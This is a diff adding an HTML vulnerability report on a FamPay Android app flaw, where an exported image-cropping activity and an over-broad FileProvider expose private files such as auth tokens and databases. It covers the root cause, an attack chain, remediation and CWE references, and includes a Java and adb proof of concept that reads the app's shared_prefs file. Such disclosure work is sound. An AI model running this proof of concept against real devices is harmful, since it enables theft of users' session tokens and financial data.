@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain D Report — CropImageActivity + FileProvider | FamPay Security</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:24px 16px;max-width:760px;margin:0 auto;font-size:13px;line-height:1.7}
+  h1{font-size:22px;font-weight:900;color:#fff;margin-bottom:4px}
+  h2{font-size:14px;font-weight:700;color:#ffea00;margin:28px 0 10px;letter-spacing:0.3px;text-transform:uppercase}
+  h3{font-size:12px;font-weight:700;color:#aaa;margin:16px 0 6px;text-transform:uppercase;letter-spacing:0.3px}
+  p{color:#bbb;margin-bottom:10px}
+  .badge{display:inline-block;font-size:10px;background:#1a1a00;border:1px solid #ffea00;color:#ffea00;padding:3px 12px;border-radius:20px;letter-spacing:1px;margin-bottom:12px}
+  .severity-bar{display:flex;align-items:center;gap:12px;background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px 20px;margin-bottom:20px;flex-wrap:wrap}
+  .sev-label{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:0.5px}
+  .sev-high{font-size:28px;font-weight:900;color:#ffea00}
+  .divider{width:1px;height:40px;background:#2a2a3a}
+  .meta-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
+  .meta-card{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:14px}
+  .meta-card .mk{font-size:10px;color:#555;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+  .meta-card .mv{font-size:12px;color:#e0e0e0;font-family:monospace;word-break:break-all}
+  code{background:#1a1a2a;border:1px solid #2a2a3a;padding:2px 6px;border-radius:3px;font-family:monospace;font-size:11px;color:#00e676}
+  pre{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;overflow-x:auto;font-size:11px;color:#00e676;line-height:1.6;margin:10px 0}
+  .attack-chain{background:#13131a;border:1px solid #2a2a3a;border-radius:8px;padding:16px;margin:10px 0}
+  .chain-step{display:flex;gap:12px;align-items:flex-start;padding:8px 0;border-bottom:1px solid #1a1a2a}
+  .chain-step:last-child{border:none}
+  .step-num{background:#ffea00;color:#000;font-size:10px;font-weight:900;padding:2px 7px;border-radius:10px;min-width:24px;text-align:center;margin-top:1px}
+  .step-body .step-title{font-size:12px;color:#fff;font-weight:700;margin-bottom:2px}
+  .step-body .step-desc{font-size:11px;color:#888}
+  .fix-card{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:8px;padding:14px;margin:8px 0}
+  .fix-card h4{font-size:11px;color:#00e676;margin-bottom:8px;text-transform:uppercase;letter-spacing:0.3px}
+  .adb-box{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:14px;margin:10px 0}
+  .adb-label{font-size:9px;color:#555;margin-bottom:8px;letter-spacing:0.5px;text-transform:uppercase}
+  .tag{display:inline-block;font-size:9px;background:#1a1a2a;border:1px solid #2a2a3a;color:#448aff;padding:1px 6px;border-radius:3px;margin-right:4px}
+  .back-links{display:flex;gap:16px;font-size:11px;margin-top:28px;flex-wrap:wrap}
+  .back-links a{color:#448aff;text-decoration:none}
+  .highlight{background:#1a1a00;border-left:3px solid #ffea00;padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:12px;color:#ffea00}
+  .file-list{background:#0d0d14;border:1px solid #2a2a3a;border-radius:6px;padding:12px;margin:10px 0}
+  .file-item{padding:4px 0;border-bottom:1px solid #1a1a2a;font-family:monospace;font-size:11px;color:#00e676}
+  .file-item:last-child{border:none}
+  .file-item .fi-path{color:#448aff}
+  .file-item .fi-desc{color:#555;font-size:10px}
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY REPORT — CHAIN D</span>
+<h1>CropImageActivity + FileProvider Internal File Read</h1>
+<p style="color:#666;font-size:11px;margin-bottom:20px">FamPay Android v4.0.5.7 · Oversecured Finding #3 (Content Provider) · March 2026</p>
+
+<div class="severity-bar">
+  <div><div class="sev-label">Severity</div><div class="sev-high">HIGH</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">CVSS Score</div><div class="sev-score" style="font-size:22px;font-weight:700;color:#ffea00">7.5</div></div>
+  <div class="divider"></div>
+  <div><div class="sev-label">Type</div><div class="sev-score">Exported Activity + Overly Permissive FileProvider</div></div>
+</div>
+
+<div class="meta-grid">
+  <div class="meta-card"><div class="mk">Vulnerable Activity</div><div class="mv">com.theartofdev.edmodo.cropper.CropImageActivity</div></div>
+  <div class="meta-card"><div class="mk">Manifest Setting</div><div class="mv">android:exported="true"</div></div>
+  <div class="meta-card"><div class="mk">FileProvider Config</div><div class="mv">&lt;root-path name="root" path="." /&gt;</div></div>
+  <div class="meta-card"><div class="mk">Files Exposed</div><div class="mv">Entire app private directory: databases, SharedPrefs, tokens</div></div>
+</div>
+
+<h2>Executive Summary (Non-Technical)</h2>
+<p>FamPay includes a photo cropping feature (<code>CropImageActivity</code>) that is incorrectly marked as accessible to any app on the device. Combined with a misconfigured file-sharing setting that grants access to the entire app's private storage, any malicious app can read FamPay's internal files — including the SQLite database, saved login tokens, and configuration files.</p>
+
+<div class="highlight">Imagine FamPay accidentally left its vault door open and labeled it with a "welcome" sign. Any other app on the user's phone can walk in and take documents — the SQLite database (transaction history, linked accounts), session tokens, and app configuration.</div>
+
+<h2>Exposed Files (High Value Targets)</h2>
+<div class="file-list">
+  <div class="file-item"><span class="fi-path">/data/data/com.fampay.in/databases/</span><br><span class="fi-desc">SQLite: transaction history, linked bank accounts, beneficiaries</span></div>
+  <div class="file-item"><span class="fi-path">/data/data/com.fampay.in/shared_prefs/</span><br><span class="fi-desc">XML: auth tokens, refresh tokens, device binding keys, user ID</span></div>
+  <div class="file-item"><span class="fi-path">/data/data/com.fampay.in/files/</span><br><span class="fi-desc">Cached responses, Firebase tokens, any persisted app state</span></div>
+  <div class="file-item"><span class="fi-path">/data/data/com.fampay.in/cache/</span><br><span class="fi-desc">Network cache, image cache, may contain API responses with PII</span></div>
+</div>
+
+<h2>Root Cause</h2>
+<h3>1. CropImageActivity exported with no restrictions</h3>
+<pre>&lt;!-- AndroidManifest.xml line ~906 --&gt;
+&lt;activity
+  android:name="com.theartofdev.edmodo.cropper.CropImageActivity"
+  android:exported="true"   &lt;!-- any app can start this --&gt;
+  android:theme="@style/Base.Theme.AppCompat" /&gt;</pre>
+
+<h3>2. FileProvider root-path exposes everything</h3>
+<pre>&lt;!-- res/xml/file_paths.xml --&gt;
+&lt;paths&gt;
+  &lt;root-path name="root" path="." /&gt;  &lt;!-- exposes "/" — entire filesystem --&gt;
+  &lt;files-path name="files" path="." /&gt;
+  &lt;cache-path name="cache" path="." /&gt;
+&lt;/paths&gt;</pre>
+
+<h3>3. CropImageActivity passes result Intent without stripping URI</h3>
+<pre>// CropImageActivity.java
+intent.putExtras(getIntent());        // copies attacker-controlled extras
+setResult(i3, intent);                // returns them to caller
+finish();</pre>
+
+<h2>Attack Chain</h2>
+<div class="attack-chain">
+  <div class="chain-step">
+    <div class="step-num">1</div>
+    <div class="step-body">
+      <div class="step-title">Malicious app starts CropImageActivity</div>
+      <div class="step-desc">Sends Intent with <code>CROP_IMAGE_EXTRA_SOURCE</code> pointing to a FamPay content:// URI for any internal file</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">2</div>
+    <div class="step-body">
+      <div class="step-title">FamPay FileProvider grants read access</div>
+      <div class="step-desc">Because <code>root-path path="."</code> covers the entire private data directory, the URI is valid</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">3</div>
+    <div class="step-body">
+      <div class="step-title">CropImageActivity reads the file, returns result</div>
+      <div class="step-desc">Activity processes the file as an "image to crop" — but the malicious app intercepts the onActivityResult</div>
+    </div>
+  </div>
+  <div class="chain-step">
+    <div class="step-num">4</div>
+    <div class="step-body">
+      <div class="step-title">Malicious app reads file bytes via returned URI</div>
+      <div class="step-desc">Full content of SharedPreferences XML (auth tokens) or SQLite DB is now in the attacker's hands</div>
+    </div>
+  </div>
+</div>
+
+<h2>ADB Proof of Concept</h2>
+<div class="adb-box">
+  <div class="adb-label">Step 1 — Build malicious APK (attacker device)</div>
+  <pre>// AttackerActivity.java
+Intent i = new Intent();
+i.setComponent(new ComponentName(
+    "com.fampay.in",
+    "com.theartofdev.edmodo.cropper.CropImageActivity"
+));
+// Request FamPay's SharedPreferences (auth tokens)
+Uri fileUri = Uri.parse(
+    "content://com.fampay.in.provider/root/data/data/com.fampay.in/shared_prefs/fampay_prefs.xml"
+);
+i.putExtra("CROP_IMAGE_EXTRA_SOURCE", fileUri);
+i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+startActivityForResult(i, 1337);</pre>
+</div>
+
+<div class="adb-box">
+  <div class="adb-label">Step 2 — ADB Validation Command</div>
+  <pre>adb shell am start -n com.fampay.in/.CropImageActivity \
+  --es CROP_IMAGE_EXTRA_SOURCE \
+  "content://com.fampay.in.provider/root/data/data/com.fampay.in/shared_prefs/fampay_prefs.xml"</pre>
+</div>
+
+<div class="adb-box">
+  <div class="adb-label">Step 3 — List SharedPrefs files</div>
+  <pre>adb shell run-as com.fampay.in ls -la shared_prefs/
+# Or if device is rooted:
+adb shell ls /data/data/com.fampay.in/shared_prefs/</pre>
+</div>
+
+<h2>Remediation</h2>
+<div class="fix-card">
+  <h4>Fix 1 — Remove exported=true from CropImageActivity</h4>
+  <pre>&lt;activity
+  android:name="com.theartofdev.edmodo.cropper.CropImageActivity"
+  android:exported="false"  &lt;!-- Only internal app can start this --&gt;
+  android:theme="@style/Base.Theme.AppCompat" /&gt;</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 2 — Restrict FileProvider to specific subdirectories</h4>
+  <pre>&lt;!-- Replace root-path with specific paths --&gt;
+&lt;paths&gt;
+  &lt;!-- REMOVE: &lt;root-path name="root" path="." /&gt; --&gt;
+  &lt;files-path name="images" path="images/" /&gt;     &lt;!-- only images --&gt;
+  &lt;cache-path name="img_cache" path="images/" /&gt;  &lt;!-- only image cache --&gt;
+&lt;/paths&gt;</pre>
+</div>
+<div class="fix-card">
+  <h4>Fix 3 — Update android-image-cropper library</h4>
+  <p>The vulnerable version of <code>com.theartofdev.edmodo:android-image-cropper</code> is unmaintained. Replace with <code>com.vanniktech:android-image-cropper</code> which is the maintained fork and has this issue resolved.</p>
+</div>
+
+<h2>References</h2>
+<p><span class="tag">CWE-926</span> Improper Export of Android Application Components</p>
+<p><span class="tag">CWE-552</span> Files or Directories Accessible to External Parties</p>
+<p><span class="tag">Oversecured</span> Finding #3 — Theft of Arbitrary Files</p>
+
+<div class="back-links">
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+</body>
+</html>
